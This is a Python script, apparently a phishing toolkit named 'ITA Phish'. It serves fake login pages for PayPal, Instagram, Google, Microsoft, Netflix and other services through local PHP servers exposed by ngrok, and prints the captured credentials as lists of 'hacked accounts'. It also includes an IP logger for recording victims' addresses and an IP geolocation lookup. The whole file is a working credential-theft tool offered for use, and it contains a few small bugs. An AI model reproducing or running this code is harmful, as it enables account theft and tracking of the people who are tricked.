#coding:utf-8
#Script created by Hades ITA great: Davistar
import os
import subprocess
import sys
import platform
import json
import requests
import random
import socket


picolo = '''
              _.---..._     
           ./^         ^-._       
         ./^C===.         ^\.   /|
        .|'     \\        _ ^|.^.|
   ___.--'_     ( )  .      ./ /||
  /.---^T\      ,     |     / /|||
 C'   ._`|  ._ /  __,-/    / /-,||
      \ \/    ;  /O  / _    |) )|,
       i \./^O\./_,-^/^    ,;-^,'      
        \ |`--/ ..-^^      |_-^       
         `|  \^-           /|:       
          i.  .--         / '|.                                   
           i   =='       /'  |\._                                 
         _./`._        //    |.  ^-ooo.._                        
  _.oo../'  |  ^-.__./X/   . `|    |#######b                  
 d####     |'      ^^^^   /   |    _\#######               
 #####b ^^^^^^^^--. ...--^--^^^^^^^_.d######                
 ######b._         Y            _.d#########              
 ##########b._     |        _.d#############           

'''


about = '''
 
 ▄▄▄· ▄▄▄▄·       ▄• ▄▌▄▄▄▄▄    • ▌ ▄ ·. ▄▄▄ .
▐█ ▀█ ▐█ ▀█▪▪     █▪██▌•██      ·██ ▐███▪▀▄.▀·
▄█▀▀█ ▐█▀▀█▄ ▄█▀▄ █▌▐█▌ ▐█.▪    ▐█ ▌▐▌▐█·▐▀▀▪▄
▐█ ▪▐▌██▄▪▐█▐█▌.▐▌▐█▄█▌ ▐█▌·    ██ ██▌▐█▌▐█▄▄▌
 ▀  ▀ ·▀▀▀▀  ▀█▄▀▪ ▀▀▀  ▀▀▀     ▀▀  █▪▀▀▀ ▀▀▀ 

'''

banner1 = '''
\033[1;35m
██╗████████╗ █████╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██║╚══██╔══╝██╔══██╗    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
██║   ██║   ███████║    ██████╔╝███████║██║███████╗███████║
██║   ██║   ██╔══██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
██║   ██║   ██║  ██║    ██║     ██║  ██║██║███████║██║  ██║
╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
By Prax IT                              version: 1.0                
'''


banner2 = '''
\033[1;35m
██▓▄▄▄█████▓ ▄▄▄          ██▓███   ██░ ██  ██▓  ██████  ██░ ██ 
▓██▒▓  ██▒ ▓▒▒████▄       ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒
▒██▒▒ ▓██░ ▒░▒██  ▀█▄     ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░
░██░░ ▓██▓ ░ ░██▄▄▄▄██    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ 
░██░  ▒██▒ ░  ▓█   ▓██▒   ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓
░▓    ▒ ░░    ▒▒   ▓▒█░   ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
 ▒ ░    ░      ▒   ▒▒ ░   ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
 ▒ ░  ░        ░   ▒      ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░
 ░                 ░  ░             ░  ░  ░ ░        ░   ░  ░  ░

By Prax IT                                       version 1.0                                                                
'''

banner3 = '''
\033[1;35m
 ______  ______  ______      ____    __  __  ______  ____    __  __     
/\__  _\/\__  _\/\  _  \    /\  _`\ /\ \/\ \/\__  _\/\  _`\ /\ \/\ \    
\/_/\ \/\/_/\ \/\ \ \L\ \   \ \ \L\ \ \ \_\ \/_/\ \/\ \,\L\_\ \ \_\ \   
   \ \ \   \ \ \ \ \  __ \   \ \ ,__/\ \  _  \ \ \ \ \/ _\__ \\ \  _  \  
    \_\ \__ \ \ \ \ \ \/\ \   \ \ \/  \ \ \ \ \ \_\ \__/\ \L\ \ \ \ \ \ 
    /\_____\ \ \_\ \ \_\ \_\   \ \_\   \ \_\ \_\/\_____\ `\____\ \_\ \_\\
    \/_____/  \/_/  \/_/\/_/    \/_/    \/_/\/_/\/_____/\/_____/\/_/\/_/

By Prax IT                                                version 1.0                                                                      
'''


choice_banner = [banner1, banner2, banner3]
banner = random.choice(choice_banner)
platform_os = platform.system()
platform_distro = platform.version()
requests_get_ip = requests.get('https://ifconfig.me/')
content_myip = requests_get_ip.text
platform_hostname = platform.node()
check_usernames_text1 = os.path.exists("paypal/usernames.txt")
check_usernames_text2 = os.path.exists("instagram/usernames.txt")
check_usernames_text3 = os.path.exists("snapchat/usernames.txt")
check_usernames_text4 = os.path.exists("netflix/usernames.txt")
check_usernames_text5 = os.path.exists("origin/usernames.txt")
check_usernames_text6 = os.path.exists("google/usernames.txt")
check_usernames_text7 = os.path.exists("twitter/usernames.txt")
check_usernames_text8 = os.path.exists("spotify/usernames.txt")
check_usernames_text9 = os.path.exists("linkedin/usernames.txt")
check_usernames_text10 = os.path.exists("microsoft/usernames.txt")
check_usernames_text11 = os.path.exists("pinterest/usernames.txt")
check_ip_text = os.path.exists("iplogger/ip.txt")



if 'Linux' not in platform.platform():
        sys.exit('Linux is Required !')


os.system("clear")
print(banner)
print("\033[1;36m[\033[32m*\033[1;36m] OS :\033[1;31m "+platform_os)
print("\033[1;36m[\033[32m*\033[1;36m] OS version :\033[1;31m "+platform_distro)
print("\033[1;36m[\033[32m*\033[1;36m] User :\033[1;31m "+platform_hostname)
print("\033[1;36m[\033[32m*\033[1;36m] IP :\033[1;31m "+str(content_myip))
print("\033[35m")  
print("+=============================+==================+")
print("|          Phishing           |      Other       |")
print("+=============================+==================+")
print("|1)  Paypal                   | 100) IPgeo       |")
print("|2)  Instagram                | 101) Website IP  |")
print("|3)  Snapchat                 | 102) IP Logger   |")
print("|4)  Netflix                  | 103) About me    |")
print("|5)  Origin                   |                  |")
print("|6)  Google                   |                  |")
print("|7)  Twitter                  |                  |")
print("|8)  Spotify                  |                  |")
print("|9)  Linkedin                 |                  |")
print("|10) Microsoft                |                  |")
print("|11) Pinterest                |                  |")
print("+=============================+==================+")


print("")
choice = int(input('\033[1;34m[Enter your choice]>\033[33m '))
if choice == 1:
    os.system("cd paypal && php -S 127.0.0.1:3000 > /dev/null 2>&1 &")
    os.system("./ngrok http 3000")
    os.system("killall -2 php")
    os.chdir("paypal")
    os.system("clear")
    print(picolo)
    print("\033[34m[List of Paypal hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
    
    

if choice == 2:
    os.system("cd instagram && php -S 127.0.0.1:3001 > /dev/null 2>&1 &")
    os.system("./ngrok http 3001")
    os.system("killall -2 php")
    os.chdir("instagram")
    os.system("clear")
    print(picolo)
    print("\033[34m[List of Instagram hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()

    
if choice == 3:
    os.system("cd snapchat && php -S 127.0.0.1:3002 > /dev/null 2>&1 &")
    os.system("./ngrok http 3002")
    os.system("killall -2 php")
    os.chdir("snapchat")
    os.system("clear")
    print(picolo)
    print("\033[33m[List of Snapchat hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
    

if choice == 4:
    os.system("cd netflix && php -S 127.0.0.1:3003 > /dev/null 2>&1 &")
    os.system("./ngrok http 3003")
    os.system("killall -2 php")
    os.chdir("netflix")
    os.system("clear")
    print(picolo)
    print("\033[31m[List of Netflix hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
    

if choice == 5:
    os.system("cd origin && php -S 127.0.0.1:3004 > /dev/null 2>&1 &")
    os.system("./ngrok http 3004")
    os.system("killall -2 php")
    os.chdir("origin")
    os.system("clear")
    print(picolo)
    print("\033[33m[List of Origin hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
   
if choice == 6:
    os.system("cd google && php -S 127.0.0.1:3005 > /dev/null 2>&1 &")
    os.system("./ngrok http 3005")
    os.system("killall -2 php")
    os.chdir("google")
    os.system("clear")
    print(picolo)
    print("\033[33m[List of Google hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
 
if choice == 7:
    os.system("cd twitter && php -S 127.00.1:3006 > /dev/null 2>&1 &")
    os.system("./ngrok http 3006")
    os.system("killall -2 php")
    os.chdir("twitter")
    os.system("clear")
    print(picolo)
    print("\033[36m[List of Twitter hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
    

if choice == 8:
    os.system("cd spotify && php -S 127.0.0.1:3007 > /dev/null 2>&1 &")
    os.system("./ngrok http 3007")
    os.system("killall -2 php")
    os.chdir("spotify")
    os.system("clear")
    print(picolo)
    print("\033[32m[List of Spotify hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()



if choice == 99:
    print("\033[32m")
    os.system("clear")
    print(picolo)
    print("I AM YOU'RE FATHER !!!!!")
    var = input()

if choice == 9:
    os.system("cd linkedin && php -S 127.0.0.1:3008 > /dev/null 2>&1 &")
    os.system("./ngrok http 3008")
    os.system("killall -2 php")
    os.chdir("linkedin")
    os.system("clear")
    print(picolo)
    print("\033[32m[List of Linkedin hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
    

if choice == 10:
    os.system("cd microsoft && php -S 127.0.0.1:3009 > /dev/null 2>&1 &")
    os.system("./ngrok http 3009")
    os.system("killall -2 php")
    os.chdir("microsoft")
    os.system("clear")
    print(picolo)
    print("\033[32m[List of Microsoft hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
   


if choice == 100:
    try:
       os.system("clear")
       print(banner)
       target_ip = str(input("[Enter IP to locate]> "))
       os.system("clear")
       print(banner)
       requests_ip_geo = requests.get('https://ipinfo.io/'+target_ip+'/geo')
       content_geo = requests_ip_geo.text
       obj_geo = json.loads(content_geo)
       ip_geo = obj_geo['ip']
       city_geo = obj_geo['city']
       country_geo = obj_geo['country']
       region_geo = obj_geo['region']
       loc_geo = obj_geo['loc']
       print("\033[1;36m")
       print("==================================================")
       print("\033[1;36m[\033[32m*\033[1;36m][IP]:\033[35m "+str(ip_geo))
       print("\033[1;36m[\033[32m*\033[1;36m][CITY]:\033[35m "+str(city_geo))
       print("\033[1;36m[\033[32m*\033[1;36m][COUNTRY]:\033[35m "+str(country_geo))
       print("\033[1;36m[\033[32m*\033[1;36m][REGION]:\033[35m "+str(region_geo))
       print("\033[1;36m[\033[32m*\033[1;36m][LATITUDE, LONGITUDE]:\033[35m "+str(loc_geo))
       print("\033[1;36m==================================================")
       print("")
       var = input("\033[37mPress Enter to Quit") 
    
    except:
        print("Ip Invalid !")
        print("")
        var = input("\033[37mPress Enter to Quit")


if choice == 101:
    try:
       os.system("clear")
       print(banner)
       target = str(input("[Enter Target Website]> "))
       os.system("clear")
       print(banner)
       s = socket.gethostbyname(target)
       print("")
       print("\033[1;36m======================================================")
       print("\033[1;36m[\033[32m*\033[1;36m][IP]:\033[35m "+s+" | "+target)
       print("\033[1;36m======================================================")
       print("")
       var = input("\033[37mPress Enter to Quit")

    except:
        print("Website Invalid !")
        print("")
        var = input("\033[37mPress Enter to Quit")


if choice == 11:
    os.system("cd pinterest && php -S 127.0.0.1:3010 > /dev/null 2>&1 &")
    os.system("./ngrok http 3010")
    os.system("./killall -2 php")
    os.chdir("pinterest")
    os.system("clear")
    print(picolo)
    print("\033[31m[List of Pinterest hacked account]")
    print("")
    os.system("cat usernames.txt")
    var = input()
    
    

if choice == 102:
    os.system("cd iplogger && php -S 127.0.0.1:4000 > /dev/numm 2>&1 &")
    os.system("./ngrok http 4000")
    os.system("killall -2 php")
    os.chdir("iplogger")
    os.system("clear")
    print(banner)
    print("\033[32m[IP of you're victim]")
    print("")
    os.system("cat ip.txt")
    print("")
    var = input("\033[37MPress Enter to Quit")
    os.system("rm -r ip.txt")
    
    
if choice == 999:
    os.system("clear")
    sys.exit("Exiting....")


if choice == 103:
    os.system("clear")
    print(about)
    print("")
    print("Created By Prax IT")
    print("Instagram : https://www.instagram.com/hades_ita/?hl=fr")
    print("My discord server : https://discord.gg/EfXtwS6")
    var = input()
